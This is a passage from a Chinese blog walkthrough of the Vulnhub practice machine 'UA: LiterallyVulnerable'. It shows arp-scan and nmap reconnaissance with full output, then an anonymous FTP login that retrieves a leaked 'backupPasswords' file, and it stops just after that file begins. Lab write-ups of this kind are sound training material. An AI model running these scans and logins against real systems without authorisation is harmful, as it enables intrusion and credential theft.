<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>ua-literally-vulnerable | Eki&#39;s blog</title>
    <meta name="generator" content="VuePress 1.9.5">
    <link rel="icon" href="/img/favicon.ico">
    <undefined></undefined>
    <link rel="alternate" type="application/rss+xml" href="https://blog.ieki.xyz/rss.xml" title="Eki&#39;s blog RSS Feed">
    <link rel="alternate" type="application/atom+xml" href="https://blog.ieki.xyz/feed.atom" title="Eki&#39;s blog Atom Feed">
    <link rel="alternate" type="application/json" href="https://blog.ieki.xyz/feed.json" title="Eki&#39;s blog JSON Feed">
    <meta name="description" content="网络空间安全技术博客">
    <meta name="keywords" content="CTF,Pentest,网络空间安全">
    <meta name="baidu-site-verification" content="7F55weZDDc">
    <meta name="theme-color" content="#11a8cd">
    
    <link rel="preload" href="/assets/css/0.styles.05e4719f.css" as="style"><link rel="preload" href="/assets/js/app.8153bfb8.js" as="script"><link rel="preload" href="/assets/js/2.236d623d.js" as="script"><link rel="preload" href="/assets/js/63.27f549f4.js" as="script"><link rel="prefetch" href="/assets/js/10.46edbeee.js"><link rel="prefetch" href="/assets/js/100.6c7b5950.js"><link rel="prefetch" href="/assets/js/11.767adcb8.js"><link rel="prefetch" href="/assets/js/12.512cfd28.js"><link rel="prefetch" href="/assets/js/13.3a1a8df2.js"><link rel="prefetch" href="/assets/js/14.9af53798.js"><link rel="prefetch" href="/assets/js/15.ec2fb3eb.js"><link rel="prefetch" href="/assets/js/16.2a2ab730.js"><link rel="prefetch" href="/assets/js/17.f68cb202.js"><link rel="prefetch" href="/assets/js/18.63691748.js"><link rel="prefetch" href="/assets/js/19.c42e067a.js"><link rel="prefetch" href="/assets/js/20.d572d5a9.js"><link rel="prefetch" href="/assets/js/21.2adaf23d.js"><link rel="prefetch" href="/assets/js/22.ec130e8f.js"><link rel="prefetch" href="/assets/js/23.91dff6b1.js"><link rel="prefetch" href="/assets/js/24.e99440a5.js"><link rel="prefetch" href="/assets/js/25.c058aace.js"><link rel="prefetch" href="/assets/js/26.64c96eb1.js"><link rel="prefetch" href="/assets/js/27.dc5608c6.js"><link rel="prefetch" href="/assets/js/28.6485ffc0.js"><link rel="prefetch" href="/assets/js/29.853384e7.js"><link rel="prefetch" href="/assets/js/3.18b28bc3.js"><link rel="prefetch" href="/assets/js/30.5e8757c8.js"><link rel="prefetch" href="/assets/js/31.f620c04c.js"><link rel="prefetch" href="/assets/js/32.0b35c345.js"><link rel="prefetch" href="/assets/js/33.643f4002.js"><link rel="prefetch" href="/assets/js/34.17bda2ac.js"><link rel="prefetch" href="/assets/js/35.3194ffeb.js"><link rel="prefetch" href="/assets/js/36.7a864c05.js"><link rel="prefetch" href="/assets/js/37.ded9d5a1.js"><link rel="prefetch" href="/assets/js/38.e886837c.js"><link rel="prefetch" href="/assets/js/39.6fbcf82c.js"><link rel="prefetch" href="/assets/js/4.aa35785a.js"><link rel="prefetch" href="/assets/js/40.042825c7.js"><link rel="prefetch" href="/assets/js/41.be0e220a.js"><link rel="prefetch" href="/assets/js/42.16c54959.js"><link rel="prefetch" href="/assets/js/43.15487375.js"><link rel="prefetch" href="/assets/js/44.1bc3c0c9.js"><link rel="prefetch" href="/assets/js/45.4f713272.js"><link rel="prefetch" href="/assets/js/46.e09111f6.js"><link rel="prefetch" href="/assets/js/47.36f7aeac.js"><link rel="prefetch" href="/assets/js/48.f34dbf5d.js"><link rel="prefetch" href="/assets/js/49.736656d6.js"><link rel="prefetch" href="/assets/js/5.bf7c6b0f.js"><link rel="prefetch" href="/assets/js/50.198eeffb.js"><link rel="prefetch" href="/assets/js/51.97647028.js"><link rel="prefetch" href="/assets/js/52.c52a4607.js"><link rel="prefetch" href="/assets/js/53.7c2edc1a.js"><link rel="prefetch" href="/assets/js/54.fffca202.js"><link rel="prefetch" href="/assets/js/55.5ae50670.js"><link rel="prefetch" href="/assets/js/56.495068e5.js"><link rel="prefetch" href="/assets/js/57.a87d7435.js"><link rel="prefetch" href="/assets/js/58.67aa347c.js"><link rel="prefetch" href="/assets/js/59.df8d3736.js"><link rel="prefetch" href="/assets/js/6.3a52ecd1.js"><link rel="prefetch" href="/assets/js/60.dfcbd8de.js"><link rel="prefetch" href="/assets/js/61.c190617e.js"><link rel="prefetch" href="/assets/js/62.4cebd179.js"><link rel="prefetch" href="/assets/js/64.aa783284.js"><link rel="prefetch" href="/assets/js/65.5c153c60.js"><link rel="prefetch" href="/assets/js/66.57abb67a.js"><link rel="prefetch" href="/assets/js/67.3e60853d.js"><link rel="prefetch" href="/assets/js/68.fafb9569.js"><link rel="prefetch" href="/assets/js/69.bb71fbbe.js"><link rel="prefetch" href="/assets/js/7.ec46daa9.js"><link rel="prefetch" href="/assets/js/70.55a74c83.js"><link rel="prefetch" href="/assets/js/71.6edff065.js"><link rel="prefetch" href="/assets/js/72.2272d6b4.js"><link rel="prefetch" href="/assets/js/73.84a336f4.js"><link rel="prefetch" href="/assets/js/74.743857b6.js"><link rel="prefetch" href="/assets/js/75.7afd7794.js"><link rel="prefetch" href="/assets/js/76.c69ff262.js"><link rel="prefetch" href="/assets/js/77.a3789c9d.js"><link rel="prefetch" href="/assets/js/78.0a082dca.js"><link rel="prefetch" href="/assets/js/79.ac794bd1.js"><link rel="prefetch" href="/assets/js/8.20733eb2.js"><link rel="prefetch" href="/assets/js/80.f346fded.js"><link rel="prefetch" href="/assets/js/81.1148a126.js"><link rel="prefetch" href="/assets/js/82.a0646f03.js"><link rel="prefetch" href="/assets/js/83.3f5285e3.js"><link rel="prefetch" href="/assets/js/84.0b41ad40.js"><link rel="prefetch" href="/assets/js/85.05acaff5.js"><link rel="prefetch" href="/assets/js/86.6332ed81.js"><link rel="prefetch" href="/assets/js/87.1e154849.js"><link rel="prefetch" href="/assets/js/88.ef9fe71b.js"><link rel="prefetch" href="/assets/js/89.644c6266.js"><link rel="prefetch" href="/assets/js/9.34ad444d.js"><link rel="prefetch" href="/assets/js/90.7a517ed7.js"><link rel="prefetch" href="/assets/js/91.724c1d33.js"><link rel="prefetch" href="/assets/js/92.c37e9d81.js"><link rel="prefetch" href="/assets/js/93.e6e1d6ba.js"><link rel="prefetch" href="/assets/js/94.bd88bff3.js"><link rel="prefetch" href="/assets/js/95.a64b5926.js"><link rel="prefetch" href="/assets/js/96.11700cb6.js"><link rel="prefetch" href="/assets/js/97.61fe23a4.js"><link rel="prefetch" href="/assets/js/98.0ae964e9.js"><link rel="prefetch" href="/assets/js/99.44a05c74.js">
    <link rel="stylesheet" href="/assets/css/0.styles.05e4719f.css">
  </head>
  <body class="theme-mode-light">
    <div id="app" data-server-rendered="true"><div class="theme-container sidebar-open have-rightmenu have-body-img"><header class="navbar blur"><div title="目录" class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/img/EB-logo.png" alt="Eki's blog" class="logo"> <span class="site-name can-hide">Eki's blog</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">Home</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="CTF" class="dropdown-title"><a href="/ctf/" class="link-title">CTF</a> <span class="title" style="display:none;">CTF</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>Library</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/ctf/php/" class="nav-link">PHP</a></li><li class="dropdown-subitem"><a href="/ctf/java/" class="nav-link">JAVA</a></li><li class="dropdown-subitem"><a href="/pages/f33ffd/" class="nav-link">Node</a></li><li class="dropdown-subitem"><a href="/pages/5939d7/" class="nav-link">Python</a></li></ul></li><li class="dropdown-item"><h4>Contest</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/pages/f3f203/" class="nav-link">D3CTF 2021 Write Up</a></li><li class="dropdown-subitem"><a href="/pages/8c33ec/" class="nav-link">虎符CTF2021</a></li><li class="dropdown-subitem"><a href="/pages/06932d/" class="nav-link">2021 红帽 Web Write Up</a></li></ul></li><li class="dropdown-item"><h4>Problem Set</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/ctf/ethernaut/" class="nav-link">Ethernaut Write Up</a></li></ul></li></ul></div></div><div class="nav-item"><a href="/pentest/" class="nav-link">Pentest</a></div><div class="nav-item"><a href="/develop/" class="nav-link">Develop</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="More" class="dropdown-title"><a href="/more/" class="link-title">More</a> <span class="title" style="display:none;">More</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/friends/" class="nav-link">Friends</a></li></ul></div></div><div class="nav-item"><a href="/about/" class="nav-link">About</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Favorites" class="dropdown-title"><a href="/pages/beb6c0bd8a66cea6/" class="link-title">Favorites</a> <span class="title" style="display:none;">Favorites</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/pages/beb6c0bd8a66cea6/" class="nav-link">Website</a></li><li class="dropdown-item"><!----> <a href="/pages/eee83a9211a70f9d/" class="nav-link">Tools</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Archives" class="dropdown-title"><a href="/archives/" class="link-title">Archives</a> <span class="title" style="display:none;">Archives</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/" class="nav-link">Categories</a></li><li class="dropdown-item"><!----> <a href="/tags/" class="nav-link">Tags</a></li><li class="dropdown-item"><!----> <a href="/archives/" class="nav-link">Archives</a></li></ul></div></div> <a href="https://github.com/EkiXu/blog" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav></div></header> <div class="sidebar-mask"></div> <div class="sidebar-hover-trigger"></div> <aside class="sidebar" style="display:none;"><div class="blogger"><img src="https://cdn.jsdelivr.net/gh/EkiXu/pics/imgme.png"> <div class="blogger-info"><h3>Eki</h3> <span>Dreamer of Dreams</span></div></div> <nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">Home</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="CTF" class="dropdown-title"><a href="/ctf/" class="link-title">CTF</a> <span class="title" style="display:none;">CTF</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>Library</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/ctf/php/" class="nav-link">PHP</a></li><li class="dropdown-subitem"><a href="/ctf/java/" class="nav-link">JAVA</a></li><li class="dropdown-subitem"><a href="/pages/f33ffd/" class="nav-link">Node</a></li><li class="dropdown-subitem"><a href="/pages/5939d7/" class="nav-link">Python</a></li></ul></li><li class="dropdown-item"><h4>Contest</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/pages/f3f203/" class="nav-link">D3CTF 2021 Write Up</a></li><li class="dropdown-subitem"><a href="/pages/8c33ec/" class="nav-link">虎符CTF2021</a></li><li class="dropdown-subitem"><a href="/pages/06932d/" class="nav-link">2021 红帽 Web Write Up</a></li></ul></li><li class="dropdown-item"><h4>Problem Set</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/ctf/ethernaut/" class="nav-link">Ethernaut Write Up</a></li></ul></li></ul></div></div><div class="nav-item"><a href="/pentest/" class="nav-link">Pentest</a></div><div class="nav-item"><a href="/develop/" class="nav-link">Develop</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="More" class="dropdown-title"><a href="/more/" class="link-title">More</a> <span class="title" style="display:none;">More</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/friends/" class="nav-link">Friends</a></li></ul></div></div><div class="nav-item"><a href="/about/" class="nav-link">About</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Favorites" class="dropdown-title"><a href="/pages/beb6c0bd8a66cea6/" class="link-title">Favorites</a> <span class="title" style="display:none;">Favorites</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/pages/beb6c0bd8a66cea6/" class="nav-link">Website</a></li><li class="dropdown-item"><!----> <a href="/pages/eee83a9211a70f9d/" class="nav-link">Tools</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Archives" class="dropdown-title"><a href="/archives/" class="link-title">Archives</a> <span class="title" style="display:none;">Archives</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/" class="nav-link">Categories</a></li><li class="dropdown-item"><!----> <a href="/tags/" class="nav-link">Tags</a></li><li class="dropdown-item"><!----> <a href="/archives/" class="nav-link">Archives</a></li></ul></div></div> <a href="https://github.com/EkiXu/blog" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav>  <ul class="sidebar-links"><li><a href="/pages/244392/" class="sidebar-link">dc-9</a></li><li><a href="/pages/a12e91/" class="sidebar-link">five86-1</a></li><li><a href="/pages/124385/" aria-current="page" class="active sidebar-link">ua-literally-vulnerable</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header level2"><a href="/pages/124385/#前言" class="sidebar-link">前言</a></li><li class="sidebar-sub-header level2"><a href="/pages/124385/#渗透记录" class="sidebar-link">渗透记录</a></li><li class="sidebar-sub-header level2"><a href="/pages/124385/#参考资料" class="sidebar-link">参考资料</a></li></ul></li><li><a href="/pages/8698b9/" class="sidebar-link">wakanda</a></li></ul> </aside> <div><main class="page"><div class="theme-vdoing-wrapper "><div class="articleInfo-wrap" data-v-06225672><div class="articleInfo" data-v-06225672><ul class="breadcrumbs" data-v-06225672><li data-v-06225672><a href="/" title="首页" class="iconfont icon-home router-link-active" data-v-06225672></a></li> <li data-v-06225672><a href="/categories/?category=Vulnhub%20Walk%20Through" title="分类" data-v-06225672>Vulnhub Walk Through</a></li></ul> <div class="info" data-v-06225672><div title="作者" class="author iconfont icon-touxiang" data-v-06225672><a href="https://ieki.xyz" target="_blank" title="作者" class="beLink" data-v-06225672>Eki</a></div> <div title="创建时间" class="date iconfont icon-riqi" data-v-06225672><a href="javascript:;" data-v-06225672>2021-05-10</a></div> <!----></div></div></div> <!----> <div class="content-wrapper"><div class="right-menu-wrapper"><div class="right-menu-margin"><div class="right-menu-title">目录</div> <div class="right-menu-content"></div></div></div> <h1><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAAXNSR0IArs4c6QAABH1JREFUSA3tVl1oHFUUPmdmd2ltklqbpJDiNnXFmgbFktho7YMPNiJSSZM0+CAYSkUELVhM6YuwIPpgoOKDqOBDC0XE2CQoNtQXBUFTTcCi+Wlh1V2TQExsUzcltd3M9Tt3ZjZzZ2fT+OJTL8yeM+eee757fmeJbq//KQL8X3DUSFOcfr7cRsRtxNQMWueeVzOkaITIGqQHNg5y8+jNW9ldM7A6nTpAjuolUikAwq7CE3WcM2RRDz+XGVgN3FptU/aUSlvq9Pa3iZ1+sgAqJyyAFqkipd9dqiwHF3P65YycLWc/6sqGrvoEoIp6DOFaX5h6+dnfjkWprwqsPk0dUGq5vySwDImC10KxFHgGL1SWoc92O3eVht09qdXNH11I2SsTsJYqMWzihqGMi+A+Garf3BAuuLI5oGlULyNfyB/HYNujwktOfRrMr5t77NmevqaUopx0grnKAyvVpmwUDB4x6FPXuGvYLTDwWsejwgtgkYKPqRJg8SV6xaiZ3ZTppGneS4yfH5/66fZSDHv+QZci/+h5c5UHtpy67JUqGppM0sh0Nc1dW6/N1W5Yoqat8/TU/VnadmdeW2PLLSyh0cvxBs3KbqTmwYPpxN4do/mzE8nEpvX/UMu2Wbp74zUAK5q6WkHns7V0eWkdPbPzd3rxkTGybadYySumVzhcaJFbs5UrEkQ/+CK8gF5dnh/6ciIZ73gwQ927L1IitoxKLXYP3SjYdOrHHfTZhRRlFyrorafPk20B3HPD1y2G3qKZME5Jcf3t/HUC13/8tSd++vqFveMUTwAUxSUFI1QekR1+bIze3D9MF2aq6cPvG72CgnldWCFqyRw3lwH8ZMerjTD9ElRO7Gv44wNpC90aASqGfVlz/Rx17srQ57/UU26hkhQqUB7dBR71WmzQhHUnblGmVOEw0jhbV1n9OlXUDCIRGaNV5Jp43N516fN7JmnTHdfp7Hgy0luO4aMhtkLL8Bi3bUWYvzh5Mn1dTxrL6QmGuRhGL/TiTTxRoEdTszSaq9GR0NGA3KdkOz3hqSV3MIDhQ5IVX/Ivx3umBti2es2h4eZby7x8br1rkf7Mo90AqC8aQ3sJeNzqFRu+vSANAQe3PL7l0HGOAdwDCeZYvNKeoZp1Qfs6Aipndh86HmFRi0LAnEO47wsqM6cdfjh3jBPUzhZy7nvlUfFsamED1VQt6aISHVymXZ/B2aCtIG8AI8xfobj2d3en1wWVhOeHELKmLQ1s211s88comkv4UCwWyF787mJdYXtNfhKAXVqnKTq8QZvGAGGOfaTo5pGZ/PwbUCr5+DPr/1J92JNHr9aOl/F3iI5+O1nfybsGxoimvZ3ViWSluDITw3P37mypheDIPY0tw7+O/5ApbkYw+zpfaUVu32Pi98+defdUhEpZkRFq0aqyNh9FuL9hpYbEm6iwi0z2REd09ZmyENEbuhjDWzKvZXTqKYaBIr3tt5kuPtQBZFvEUwHt60vfCNu41XsksH9Ij1BMMz1Y0OOunHNShFIP5868g5zeXmuLwL9T4b6Q2+KejgAAAABJRU5ErkJggg==">ua-literally-vulnerable<!----></h1>  <div class="theme-vdoing-content content__default"><h1 id="ua-literallyvulnerable-靶机实践"><a href="#ua-literallyvulnerable-靶机实践" class="header-anchor">#</a> UA:LiterallyVulnerable 靶机实践</h1> <h2 id="前言"><a href="#前言" class="header-anchor">#</a> 前言</h2> <p>靶机真好玩，于是又到Vulnhub上下了一个靶机玩玩，结果很多地方还是需要别人的Walk Through来指点一下，不然就彻底卡住了。。。。。</p> <p>最终成果</p> <p><img src="https://cdn.jsdelivr.net/gh/EkiXu/pics/img/Screenshot_2020-01-16_15-58-55.png" alt=""></p> <h2 id="渗透记录"><a href="#渗透记录" class="header-anchor">#</a> 渗透记录</h2> <p>打开靶机</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>arp-scan <span class="token parameter variable">-l</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>扫到地址</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token number">192.168</span>.31.166  00:0c:29:db:dd:a9       VMware, Inc.
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>看服务</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>nmap <span class="token parameter variable">-A</span> <span class="token number">192.168</span>.31.166
Starting Nmap <span class="token number">7.80</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2020</span>-01-16 <span class="token number">10</span>:50 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.31.166
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00032s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">997</span> closed ports
PORT   STATE SERVICE VERSION
<span class="token number">21</span>/tcp <span class="token function">open</span>  <span class="token function">ftp</span>     vsftpd <span class="token number">3.0</span>.3
<span class="token operator">|</span> ftp-anon: Anonymous FTP login allowed <span class="token punctuation">(</span>FTP code <span class="token number">230</span><span class="token punctuation">)</span>
<span class="token operator">|</span>_-rw-r--r--    <span class="token number">1</span> <span class="token function">ftp</span>      <span class="token function">ftp</span>           <span class="token number">325</span> Dec 04 <span class="token number">13</span>:05 backupPasswords
<span class="token operator">|</span> ftp-syst: 
<span class="token operator">|</span>   STAT: 
<span class="token operator">|</span> FTP server status:
<span class="token operator">|</span>      Connected to ::ffff:192.168.31.51
<span class="token operator">|</span>      Logged <span class="token keyword">in</span> as <span class="token function">ftp</span>
<span class="token operator">|</span>      TYPE: ASCII
<span class="token operator">|</span>      No session bandwidth limit
<span class="token operator">|</span>      Session <span class="token function">timeout</span> <span class="token keyword">in</span> seconds is <span class="token number">300</span>
<span class="token operator">|</span>      Control connection is plain text
<span class="token operator">|</span>      Data connections will be plain text
<span class="token operator">|</span>      At session startup, client count was <span class="token number">3</span>
<span class="token operator">|</span>      vsFTPd <span class="token number">3.0</span>.3 - secure, fast, stable
<span class="token operator">|</span>_End of status
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">7</span>.6p1 Ubuntu 4ubuntu0.3 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">2048</span> 2f:26:5b:e6:ae:9a:c0:26:76:26:24:00:a7:37:e6:c1 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> <span class="token number">79</span>:c0:12:33:d6:6d:9a:bd:1f:11:aa:1c:39:1e:b8:95 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> <span class="token number">83</span>:27:d3:79:d0:8b:6a:2a:23:57:5b:3c:d7:b4:e5:60 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    nginx <span class="token number">1.14</span>.0 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-generator: WordPress <span class="token number">5.3</span>
<span class="token operator">|</span>_http-server-header: nginx/1.14.0 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-title: Not so Vulnerable <span class="token operator">&amp;</span><span class="token comment">#8211; Just another WordPress site</span>
<span class="token operator">|</span>_http-trane-info: Problem with XML parsing of /evox/about
MAC Address: 00:0C:29:DB:DD:A9 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
Device type: general purpose
Running: Linux <span class="token number">3</span>.X<span class="token operator">|</span><span class="token number">4</span>.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux <span class="token number">3.2</span> - <span class="token number">4.9</span>
Network Distance: <span class="token number">1</span> hop
Service Info: OSs: Unix, Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">0.32</span> ms <span class="token number">192.168</span>.31.166

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">10.37</span> seconds
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br></div></div><p>开了ftp,ssh,http</p> <p>还是先看看http</p> <p>登上去一直刷不出来</p> <p>Console看一下发现都跳转到literally.vulnerable了</p> <p>本地绑定一下应该就可</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token builtin class-name">echo</span> <span class="token string">&quot;192.168.0.3 literally.vulnerable&quot;</span> <span class="token operator">&gt;&gt;</span> /etc/hosts
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>绑定完以后正常多了</p> <p><img src="/assets/images/Screenshot_2020-01-16_12-28-41.png" alt="Screenshot_2020-01-16_12-28-41"></p> <p>转了一圈发现没有啥注入点</p> <p>wpscan也没有什么有意思的发现</p> <p>那么我们再看看ftp服务</p> <p>我们知道ftp服务是支持anonymous登陆的</p> <p>试下靶机有没有开启相关功能</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token function">ftp</span> <span class="token number">192.168</span>.31.166
Connected to <span class="token number">192.168</span>.31.166.
<span class="token number">220</span> <span class="token punctuation">(</span>vsFTPd <span class="token number">3.0</span>.3<span class="token punctuation">)</span>
Name <span class="token punctuation">(</span><span class="token number">192.168</span>.31.166:root<span class="token punctuation">)</span>: anonymous
<span class="token number">230</span> Login successful.
Remote system <span class="token builtin class-name">type</span> is UNIX.
Using binary mode to transfer files.
ftp<span class="token operator">&gt;</span> <span class="token function">ls</span> <span class="token parameter variable">-al</span>
<span class="token number">200</span> PORT <span class="token builtin class-name">command</span> successful. Consider using PASV.
<span class="token number">150</span> Here comes the directory listing.
drwxr-xr-x    <span class="token number">2</span> <span class="token function">ftp</span>      <span class="token function">ftp</span>          <span class="token number">4096</span> Dec 04 <span class="token number">13</span>:05 <span class="token builtin class-name">.</span>
drwxr-xr-x    <span class="token number">2</span> <span class="token function">ftp</span>      <span class="token function">ftp</span>          <span class="token number">4096</span> Dec 04 <span class="token number">13</span>:05 <span class="token punctuation">..</span>
-rw-r--r--    <span class="token number">1</span> <span class="token function">ftp</span>      <span class="token function">ftp</span>           <span class="token number">325</span> Dec 04 <span class="token number">13</span>:05 backupPasswords
<span class="token number">226</span> Directory send OK.
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><p>发现泄露了一个backupPasswords</p> <p>get下来读一下</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>ftp<span class="token operator">&gt;</span> get backupPasswords
local: backupPasswords remote: backupPasswords
<span class="token number">200</span> PORT <span class="token builtin class-name">command</span> successful. Consider using PASV.
<span class="token number">150</span> Opening BINARY mode data connection <span class="token keyword">for</span> backupPasswords <span class="token punctuation">(</span><span class="token number">325</span> bytes<span class="token punctuation">)</span>.
<span class="token number">226</span> Transfer complete.
<span class="token number">325</span> bytes received <span class="token keyword">in</span> <span class="token number">0.00</span> secs <span class="token punctuation">(</span><span class="token number">112.7470</span> kB/s<span class="token punctuation">)</span>
ftp<span class="token operator">&gt;</span> <span class="token builtin class-name">exit</span>
<span class="token number">221</span> Goodbye.
root@kali:~<span class="token comment"># cat backupPasswords </span>
Hi Doe, 

I<span class="token string">'m guessing you forgot your password again! I'</span>ve added a bunch of passwords below along with your password so we don't get hacked by those elites again<span class="token operator">!</span>

